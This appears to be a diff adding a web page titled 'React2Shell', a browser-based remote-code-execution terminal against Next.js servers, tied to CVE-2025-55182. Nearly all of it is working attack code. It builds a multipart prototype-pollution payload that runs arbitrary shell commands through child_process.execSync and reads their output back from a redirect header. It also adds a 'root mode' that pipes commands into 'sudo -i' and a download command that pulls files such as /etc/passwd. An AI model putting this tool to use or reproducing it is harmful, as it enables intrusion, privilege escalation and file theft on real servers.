@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>React2Shell | Next.js RCE Web Terminal</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(145deg, #0a0c12 0%, #0f1119 100%);
+            font-family: 'Fira Code', 'JetBrains Mono', 'Cascadia Code', monospace;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            overflow: hidden;
+        }
+
+        /* Main terminal window */
+        .terminal-container {
+            width: 1400px;
+            max-width: 98vw;
+            height: 90vh;
+            background: #0b0e14;
+            border-radius: 24px;
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            backdrop-filter: blur(2px);
+            border: 1px solid rgba(72, 187, 255, 0.2);
+        }
+
+        /* Terminal header */
+        .terminal-header {
+            background: #0f121b;
+            padding: 14px 22px;
+            border-bottom: 1px solid #1e2436;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+
+        .badge {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+        }
+
+        .window-dot {
+            width: 13px;
+            height: 13px;
+            border-radius: 50%;
+            background: #ff5f56;
+            box-shadow: 0 0 4px rgba(255, 95, 86, 0.5);
+        }
+        .window-dot:nth-child(2) { background: #ffbd2e; }
+        .window-dot:nth-child(3) { background: #27c93f; }
+
+        .title {
+            color: #8a93b5;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            margin-left: 12px;
+            font-size: 0.85rem;
+        }
+
+        .target-input-area {
+            display: flex;
+            gap: 8px;
+            background: #06080e;
+            padding: 6px 12px;
+            border-radius: 40px;
+            align-items: center;
+            border: 1px solid #262e44;
+        }
+
+        .target-input-area label {
+            color: #5f7f9e;
+            font-size: 0.8rem;
+        }
+
+        #targetUrl {
+            background: transparent;
+            border: none;
+            color: #7ceb9e;
+            font-family: monospace;
+            font-size: 0.85rem;
+            width: 340px;
+            outline: none;
+        }
+
+        #targetUrl:focus {
+            color: #b9fbc0;
+        }
+
+        .root-badge {
+            background: #1a1f2e;
+            padding: 4px 12px;
+            border-radius: 30px;
+            font-size: 0.7rem;
+            font-weight: bold;
+            color: #ffb347;
+            border-left: 2px solid #ffb347;
+        }
+
+        /* Output pane */
+        .terminal-output {
+            flex: 1;
+            overflow-y: auto;
+            padding: 18px 20px;
+            background: #0a0c12;
+            font-size: 0.85rem;
+            line-height: 1.5;
+            color: #d6deeb;
+            font-family: 'Fira Code', monospace;
+            scroll-behavior: smooth;
+        }
+
+        .terminal-output pre {
+            margin: 0;
+            white-space: pre-wrap;
+            word-break: break-all;
+            font-family: inherit;
+        }
+
+        .output-line {
+            margin-bottom: 4px;
+            border-left: 2px solid transparent;
+            padding-left: 12px;
+        }
+
+        .output-error {
+            color: #ff9e7a;
+            background: rgba(255, 80, 80, 0.08);
+            border-left-color: #ff5c5c;
+        }
+
+        .output-success {
+            color: #b3e6b5;
+            border-left-color: #3acf5a;
+        }
+
+        .output-warning {
+            color: #ffd966;
+        }
+
+        .command-prompt {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: #0f111b;
+            border-top: 1px solid #1e2538;
+            padding: 12px 20px;
+            font-family: monospace;
+        }
+
+        .prompt-text {
+            color: #5ad87e;
+            font-weight: bold;
+            font-size: 0.9rem;
+            background: #121725;
+            padding: 6px 14px;
+            border-radius: 36px;
+            display: inline-flex;
+            gap: 8px;
+            white-space: nowrap;
+        }
+
+        .prompt-text span {
+            color: #6c7db0;
+        }
+
+        #cmdInput {
+            flex: 1;
+            background: #080b12;
+            border: 1px solid #29314b;
+            border-radius: 28px;
+            padding: 10px 18px;
+            color: #e2f0fa;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            outline: none;
+            transition: 0.2s;
+        }
+
+        #cmdInput:focus {
+            border-color: #3f8eff;
+            box-shadow: 0 0 6px rgba(63, 142, 255, 0.3);
+        }
+
+        button {
+            background: #1c253c;
+            border: none;
+            padding: 8px 22px;
+            border-radius: 32px;
+            color: white;
+            font-family: monospace;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+            font-size: 0.8rem;
+        }
+
+        button:hover {
+            background: #2a3657;
+            transform: scale(0.97);
+        }
+
+        .special-btn {
+            background: #2a2a44;
+            color: #ffd966;
+        }
+
+        .status-bar {
+            display: flex;
+            gap: 14px;
+            font-size: 0.7rem;
+            background: #07090e;
+            padding: 6px 18px;
+            color: #6f87aa;
+            border-top: 1px solid #191e2c;
+        }
+
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0f1119;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #2f3b5c;
+            border-radius: 8px;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border: 2px solid rgba(255,255,255,0.2);
+            border-top-color: #4ad4ff;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            margin-left: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+<div class="terminal-container">
+    <div class="terminal-header">
+        <div class="badge">
+            <div class="window-dot"></div>
+            <div class="window-dot"></div>
+            <div class="window-dot"></div>
+            <span class="title">⚡ React2Shell :: RCE Terminal</span>
+        </div>
+        <div class="target-input-area">
+            <label>🎯 TARGET:</label>
+            <input type="text" id="targetUrl" placeholder="http://localhost:3000/api/action" value="http://localhost:3000/">
+            <button id="updateTargetBtn" style="padding: 4px 12px; background:#1f2a44;">SET</button>
+        </div>
+        <div class="root-badge" id="rootModeBadge">🔓 ROOT MODE: OFF</div>
+    </div>
+
+    <div class="terminal-output" id="terminalOutput">
+        <div class="output-line output-success">╔════════════════════════════════════════════════════════════════╗</div>
+        <div class="output-line output-success">║   React2Shell Web Terminal - CVE-2025-55182 Ready             ║</div>
+        <div class="output-line output-success">║   [*] ?cmd= parameter mode | Multipart payload builder        ║</div>
+        <div class="output-line output-success">║   [*] Commands: .help | .root | .save &lt;text&gt; | .dl &lt;path&gt;   ║</div>
+        <div class="output-line output-success">╚════════════════════════════════════════════════════════════════╝</div>
+        <div class="output-line" style="margin-top: 12px;">&gt; system ready. waiting for commands...</div>
+    </div>
+
+    <div class="command-prompt">
+        <div class="prompt-text">
+            <span id="promptUser">operator</span>@<span id="promptHost">target</span>:<span id="promptCwd">~</span>$
+        </div>
+        <input type="text" id="cmdInput" placeholder="enter command (e.g., whoami, ls, id, .root)" autofocus>
+        <button id="execBtn">▶ EXECUTE</button>
+        <button id="clearBtn" class="special-btn">⌧ CLEAR</button>
+    </div>
+    <div class="status-bar">
+        <span>🛡️ exploit: CVE-2025-55182 (Next.js RCE)</span>
+        <span>⚙️ cmd parameter injection via multipart</span>
+        <span id="reqStatus">● idle</span>
+    </div>
+</div>
+
+<script>
+    // ========== Web-Based RCE Terminal ==========
+    // Full implementation of the Python shell logic but in browser JS
+    // Uses ?cmd= parameter + custom multipart payload generator (CVE-2025-55182)
+    // Works on localhost/fully controlled environment
+
+    // ----- Global State -----
+    let currentTarget = localStorage.getItem('rce_target') || "http://localhost:3000/";
+    let rootMode = false;               // toggle sudo simulation
+    let currentWorkingDir = "~";        // simulated / tracked via pwd
+    let sessionHistory = [];             // for .save functionality
+    let lastOutputRaw = "";
+    let requestInFlight = false;
+
+    // DOM elements
+    const targetInput = document.getElementById('targetUrl');
+    const updateTargetBtn = document.getElementById('updateTargetBtn');
+    const terminalDiv = document.getElementById('terminalOutput');
+    const cmdInput = document.getElementById('cmdInput');
+    const execBtn = document.getElementById('execBtn');
+    const clearBtn = document.getElementById('clearBtn');
+    const rootBadge = document.getElementById('rootModeBadge');
+    const reqStatusSpan = document.getElementById('reqStatus');
+    const promptUserSpan = document.getElementById('promptUser');
+    const promptCwdSpan = document.getElementById('promptCwd');
+
+    // helper: sanitize target URL
+    function normalizeTarget(url) {
+        url = url.trim();
+        if (!url.startsWith('http://') && !url.startsWith('https://')) {
+            url = 'http://' + url;
+        }
+        if (!url.endsWith('/')) url = url + '/';
+        return url;
+    }
+
+    // update target UI & storage
+    function setTarget() {
+        let newTarget = targetInput.value.trim();
+        if (!newTarget) return;
+        newTarget = normalizeTarget(newTarget);
+        currentTarget = newTarget;
+        localStorage.setItem('rce_target', currentTarget);
+        targetInput.value = currentTarget;
+        appendToTerminal(`[✓] Target updated to: ${currentTarget}`, "success");
+        // after target change, refresh cwd
+        updateWorkingDirectory();
+    }
+
+    // Append message to terminal (rich)
+    function appendToTerminal(text, type = "info") {
+        const lineDiv = document.createElement('div');
+        lineDiv.className = `output-line output-${type}`;
+        // preserve formatting
+        const pre = document.createElement('pre');
+        pre.textContent = text;
+        lineDiv.appendChild(pre);
+        terminalDiv.appendChild(lineDiv);
+        terminalDiv.scrollTop = terminalDiv.scrollHeight;
+        // store raw text for .save
+        lastOutputRaw = text;
+        sessionHistory.push(text);
+        // keep history manageable
+        if (sessionHistory.length > 500) sessionHistory.shift();
+    }
+
+    function clearTerminal() {
+        terminalDiv.innerHTML = '';
+        appendToTerminal("=== Terminal cleared ===", "success");
+        appendToTerminal("> Ready for next commands.", "info");
+    }
+
+    // Generate multipart payload exactly as python script but javascript equivalent
+    function buildMultipartPayload(cmd) {
+        // Escaping for shell command to avoid injection breaks
+        const escapedCmd = cmd.replace(/'/g, "\\'");
+        // Core RCE payload from CVE-2025-55182 (Next.js response splitting)
+        const prefixPayload = 
+            `var res=process.mainModule.require('child_process').execSync('${escapedCmd}',{'timeout':5000}).toString('base64');` +
+            `throw Object.assign(new Error('NEXT_REDIRECT'), {digest:\`NEXT_REDIRECT;push;/login?a=${'${res}'};307;\`});`;
+        
+        const part0 = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,` +
+            `"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"${prefixPayload}","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`;
+        
+        const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
+        let bodyParts = [];
+        bodyParts.push(`------${boundary}\r\nContent-Disposition: form-data; name="0"\r\n\r\n${part0}\r\n`);
+        bodyParts.push(`------${boundary}\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n`);
+        bodyParts.push(`------${boundary}\r\nContent-Disposition: form-data; name="2"\r\n\r\n[]\r\n`);
+        bodyParts.push(`------${boundary}--`);
+        
+        const body = bodyParts.join('');
+        const contentType = `multipart/form-data; boundary=${boundary}`;
+        return { body, contentType };
+    }
+
+    // Execute command via HTTP POST using the Next.js RCE technique (?cmd param usage)
+    // The original python class uses build_payload + /login?a= base64 extraction
+    async function executeRCE(commandText) {
+        if (requestInFlight) {
+            appendToTerminal("[!] Another request in progress, please wait.", "warning");
+            return null;
+        }
+        
+        // Handle cd built-in locally (to preserve directory state without full roundtrip)
+        if (commandText.trim().startsWith("cd ")) {
+            const newDir = commandText.trim().substring(3).trim();
+            if (newDir === "" || newDir === "~") {
+                currentWorkingDir = "~";
+                updatePromptCwd();
+                appendToTerminal(`[cd] changed directory to ${currentWorkingDir}`, "info");
+                return "";
+            }
+            // test if directory exists: send command 'cd X && pwd'
+            const testCmd = `cd ${newDir} 2>/dev/null && pwd || echo "CD_FAIL"`;
+            const output = await performRawRequest(testCmd);
+            if (output && !output.includes("CD_FAIL") && output.includes("/")) {
+                const lines = output.split('\n');
+                let newPath = lines[0].trim();
+                if (newPath && newPath.startsWith("/")) {
+                    currentWorkingDir = newPath;
+                    updatePromptCwd();
+                    appendToTerminal(`[cd] → ${currentWorkingDir}`, "success");
+                    return "";
+                } else {
+                    appendToTerminal(`cd: ${newDir}: No such directory`, "error");
+                    return "";
+                }
+            } else {
+                appendToTerminal(`cd: ${newDir}: directory not accessible`, "error");
+                return "";
+            }
+        }
+        
+        let finalCmd = commandText;
+        // if root mode enabled: wrap with sudo -i base64 style
+        if (rootMode) {
+            const b64Cmd = btoa(unescape(encodeURIComponent(finalCmd))); // base64 encode full cmd
+            finalCmd = `echo ${b64Cmd} | base64 -d | sudo -i 2>&1 || true`;
+        }
+        
+        // handle working directory injection: cd to current dir before command
+        if (currentWorkingDir && currentWorkingDir !== "~") {
+            finalCmd = `cd ${currentWorkingDir} 2>/dev/null; ${finalCmd}`;
+        }
+        
+        return await performRawRequest(finalCmd);
+    }
+    
+    async function performRawRequest(finalCmd) {
+        requestInFlight = true;
+        reqStatusSpan.innerHTML = "⚡ sending payload...";
+        try {
+            const { body, contentType } = buildMultipartPayload(finalCmd);
+            const headers = {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Next-Action": "x",
+                "X-Nextjs-Request-Id": "web-" + Math.random().toString(36),
+                "Content-Type": contentType,
+                "X-Nextjs-Html-Request-Id": "SSTMX" + Date.now()
+            };
+            
+            const response = await fetch(currentTarget, {
+                method: "POST",
+                headers: headers,
+                body: body,
+                redirect: "manual",   // handle redirects manually
+                mode: "cors",         // localhost friendly
+                credentials: "omit"
+            });
+            
+            let outputText = "";
+            // extract from headers (Location or X-Action-Redirect)
+            const locationHeader = response.headers.get("location");
+            const actionRedirect = response.headers.get("x-action-redirect");
+            
+            let redirectUrl = locationHeader || actionRedirect || "";
+            let b64Match = null;
+            // regex to capture base64 after login?a=
+            const regex = /login\?a=([A-Za-z0-9+\/=]+)/;
+            b64Match = redirectUrl.match(regex);
+            if (!b64Match && redirectUrl) {
+                const altRegex = /a=(.*?)(?:;|$)/;
+                b64Match = redirectUrl.match(altRegex);
+            }
+            
+            if (b64Match && b64Match[1]) {
+                let encoded = b64Match[1];
+                // URL decode if needed
+                try {
+                    encoded = decodeURIComponent(encoded);
+                } catch(e) {}
+                try {
+                    const decoded = atob(encoded);
+                    outputText = decoded;
+                } catch(e) {
+                    outputText = "[!] base64 decode error: " + e.message;
+                }
+            } else {
+                // fallback: try to read response text for debugging
+                const textResp = await response.text();
+                if (textResp && textResp.includes("NEXT_REDIRECT")) {
+                    outputText = "[?] Raw redirect no base64, but payload sent. check server compatibility.";
+                } else {
+                    outputText = `[!] No RCE output (status: ${response.status}). Ensure target is vulnerable.`;
+                }
+            }
+            
+            if (!outputText.trim()) outputText = "(empty output)";
+            return outputText;
+        } catch (err) {
+            console.error(err);
+            return `[ERROR] request failed: ${err.message}`;
+        } finally {
+            requestInFlight = false;
+            reqStatusSpan.innerHTML = "● idle";
+        }
+    }
+    
+    // update current working directory from server (pwd)
+    async function updateWorkingDirectory() {
+        const pwdOutput = await performRawRequest("pwd");
+        if (pwdOutput && !pwdOutput.includes("ERROR") && pwdOutput.length < 256) {
+            const lines = pwdOutput.split('\n');
+            if (lines[0] && lines[0].startsWith("/")) {
+                currentWorkingDir = lines[0].trim();
+                updatePromptCwd();
+                return;
+            }
+        }
+        currentWorkingDir = "~";
+        updatePromptCwd();
+    }
+    
+    function updatePromptCwd() {
+        let displayCwd = currentWorkingDir;
+        if (displayCwd === "~") displayCwd = "~";
+        else if (displayCwd.length > 35) displayCwd = "..." + displayCwd.slice(-28);
+        promptCwdSpan.innerText = displayCwd;
+        // update user prompt based on root mode
+        promptUserSpan.innerText = rootMode ? "root" : "operator";
+        rootBadge.innerHTML = rootMode ? "🔥 ROOT MODE: ON (sudo -i)" : "🔓 ROOT MODE: OFF";
+        if (rootMode) rootBadge.style.color = "#ff9570";
+        else rootBadge.style.color = "#ffb347";
+    }
+    
+    // toggle root mode (simulate privilege escalation)
+    function toggleRootMode() {
+        rootMode = !rootMode;
+        updatePromptCwd();
+        appendToTerminal(`[!] Root mode ${rootMode ? "ENABLED (sudo prefix)" : "DISABLED"}`, "warning");
+        // re-fetch working directory after root toggle for safety
+        setTimeout(() => updateWorkingDirectory(), 100);
+    }
+    
+    // .download command: fetch remote file via base64 method
+    async function downloadRemoteFile(remotePath, suggestedLocalName = null) {
+        if (!remotePath) {
+            appendToTerminal("[.download] Usage: .download /etc/passwd  or  .dl /var/log/syslog", "error");
+            return;
+        }
+        appendToTerminal(`[⬇] Downloading ${remotePath} via base64 encoding...`, "info");
+        const b64cmd = `base64 -w0 ${remotePath} 2>/dev/null || echo "ERR_FILE_NOT_FOUND"`;
+        let b64data = await performRawRequest(b64cmd);
+        if (!b64data || b64data.includes("ERR_FILE_NOT_FOUND") || b64data.trim() === "") {
+            appendToTerminal(`[✘] Failed to read file: ${remotePath} (not found or permission)`, "error");
+            return;
+        }
+        try {
+            const cleanB64 = b64data.replace(/\s/g, '');
+            const binaryStr = atob(cleanB64);
+            const byteArray = new Uint8Array(binaryStr.length);
+            for (let i = 0; i < binaryStr.length; i++) byteArray[i] = binaryStr.charCodeAt(i);
+            const blob = new Blob([byteArray]);
+            const link = document.createElement('a');
+            const fileName = suggestedLocalName || remotePath.split('/').pop() || "download.dat";
+            const url = URL.createObjectURL(blob);
+            link.href = url;
+            link.download = fileName;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            URL.revokeObjectURL(url);
+            appendToTerminal(`[✓] Downloaded ${remotePath} as "${fileName}" (${byteArray.length} bytes)`, "success");
+        } catch (e) {
+            appendToTerminal(`[✘] Decoding/Download error: ${e.message}`, "error");
+        }
+    }
+    
+    // save output to local file (last output)
+    function saveOutputToFile(customFilename = null) {
+        if (!lastOutputRaw || lastOutputRaw.trim() === "") {
+            appendToTerminal("[!] No recent output to save. Run a command first.", "warning");
+            return;
+        }
+        const timestamp = new Date().toISOString().slice(0,19).replace(/:/g, '-');
+        const filename = customFilename ? customFilename : `rce_output_${timestamp}.txt`;
+        const blob = new Blob([lastOutputRaw], {type: "text/plain"});
+        const link = document.createElement('a');
+        const url = URL.createObjectURL(blob);
+        link.href = url;
+        link.download = filename;
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+        URL.revokeObjectURL(url);
+        appendToTerminal(`[✓] Output saved to ${filename}`, "success");
+    }
+    
+    // Main command dispatcher
+    async function handleCommand(rawCmd) {
+        if (!rawCmd.trim()) return;
+        const cmd = rawCmd.trim();
+        // display command line in terminal
+        const promptPrefix = `${rootMode ? "root" : "operator"}@target:${currentWorkingDir}$`;
+        appendToTerminal(`${promptPrefix} ${cmd}`, "info");
+        
+        // built-in commands
+        if (cmd === ".help") {
+            appendToTerminal("Available commands:\n.root        - toggle root (sudo) mode\n.save [name] - save last command output to file\n.dl <file>   - download remote file\n.cd <dir>    - change directory\n.clear       - clear screen\n.exit        - close session (reload to restart)\n.help        - this help", "success");
+            return;
+        }
+        if (cmd === ".root") {
+            toggleRootMode();
+            return;
+        }
+        if (cmd === ".clear") {
+            clearTerminal();
+            return;
+        }
+        if (cmd === ".exit") {
+            appendToTerminal("Session terminated. Refresh page to restart shell.", "warning");
+            cmdInput.disabled = true;
+            execBtn.disabled = true;
+            return;
+        }
+        if (cmd.startsWith(".save")) {
+            const parts = cmd.split(/\s+/);
+            const fname = parts[1] || null;
+            saveOutputToFile(fname);
+            return;
+        }
+        if (cmd.startsWith(".dl") || cmd.startsWith(".download")) {
+            const parts = cmd.split(/\s+/);
+            if (parts.length < 2) {
+                appendToTerminal("Usage: .dl <remote_path> [optional_local_name]", "error");
+                return;
+            }
+            const remoteFile = parts[1];
+            const localName = parts[2] || null;
+            await downloadRemoteFile(remoteFile, localName);
+            return;
+        }
+        
+        // external command execution
+        const output = await executeRCE(cmd);
+        if (output && output.length > 0) {
+            appendToTerminal(output, "success");
+            lastOutputRaw = output;
+        } else if (output === "") {
+            // silent command (cd handled)
+        } else {
+            appendToTerminal("[no output or error]", "warning");
+        }
+        
+        // After each command, optionally refresh cwd (if not a cd, but pwd might have changed by other cmds)
+        if (!cmd.startsWith("cd ")) {
+            setTimeout(() => updateWorkingDirectory(), 200);
+        } else {
+            updatePromptCwd();
+        }
+    }
+    
+    // event bindings
+    execBtn.addEventListener('click', async () => {
+        const command = cmdInput.value;
+        if (!command) return;
+        cmdInput.value = '';
+        await handleCommand(command);
+        cmdInput.focus();
+    });
+    
+    clearBtn.addEventListener('click', () => {
+        clearTerminal();
+    });
+    
+    updateTargetBtn.addEventListener('click', () => {
+        setTarget();
+        setTimeout(() => updateWorkingDirectory(), 300);
+    });
+    
+    cmdInput.addEventListener('keypress', async (e) => {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            const command = cmdInput.value;
+            if (!command) return;
+            cmdInput.value = '';
+            await handleCommand(command);
+        }
+    });
+    
+    // initialization
+    (async function init() {
+        targetInput.value = currentTarget;
+        setTarget(); // normalize
+        updatePromptCwd();
+        await updateWorkingDirectory();
+        appendToTerminal("[*] Shell online. Exploit interface ready.", "success");
+        appendToTerminal(`[*] Target: ${currentTarget}`, "info");
+        cmdInput.focus();
+    })();
+</script>
+</body>
+</html>
